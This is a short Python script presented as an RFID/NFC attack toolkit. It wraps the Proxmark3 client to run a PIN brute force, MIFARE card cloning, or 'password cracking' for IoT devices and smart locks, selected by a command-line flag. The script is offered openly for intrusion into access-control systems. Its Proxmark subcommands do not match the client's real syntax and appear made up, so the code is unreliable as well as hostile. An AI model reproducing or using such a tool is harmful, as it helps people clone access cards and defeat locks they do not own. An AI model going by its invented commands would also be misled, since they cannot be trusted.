# -------------------------------------------
# Proxmark Full Toolkit for RFID/NFC Exploits
# -------------------------------------------
# Functionality:
# - Combines multiple RFID/NFC exploits into a single toolkit.
# - Allows you to select the type of attack to perform (PIN Brute Force, Card Cloning, Password Cracking, etc.).

# Devices being used:
# - Proxmark 3: Used for various RFID/NFC attacks.

# Example Usage:
# 1. Run the script with the attack you want to perform:
#    python proxmark_full_toolkit.py --attack pin_bruteforce
#    python proxmark_full_toolkit.py --attack card_cloning

import argparse
import subprocess

def brute_force_pin():
    subprocess.run(["proxmark3", "hf", "mifare", "bruteforce_pin"])  # Brute force PIN for MIFARE Classic

def clone_rfid_card():
    subprocess.run(["proxmark3", "hf", "mifare", "clone"])  # Clone an RFID card (MIFARE Classic)

def crack_password():
    subprocess.run(["proxmark3", "hf", "mifare", "crack_password"])  # Crack the password for IoT devices or smart locks

def main():
    parser = argparse.ArgumentParser(description="Proxmark 3 Full Toolkit for RFID/NFC Exploits")
    parser.add_argument("--attack", choices=["pin_bruteforce", "card_cloning", "password_cracking"], required=True,
                        help="Choose the attack to perform.")
    args = parser.parse_args()

    if args.attack == "pin_bruteforce":
        brute_force_pin()
    elif args.attack == "card_cloning":
        clone_rfid_card()
    elif args.attack == "password_cracking":
        crack_password()

if __name__ == "__main__":
    main()
